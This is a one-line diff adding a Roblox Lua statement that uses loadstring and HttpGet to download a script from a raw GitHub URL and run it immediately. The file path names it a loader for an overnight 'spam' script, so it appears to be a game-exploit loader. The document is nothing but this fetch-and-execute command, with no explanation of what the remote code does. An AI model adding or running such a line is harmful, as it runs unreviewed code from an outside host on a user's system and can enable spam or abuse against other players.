@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/24-hours-overnight-spam3-47841p78okv5fx.lua"))()
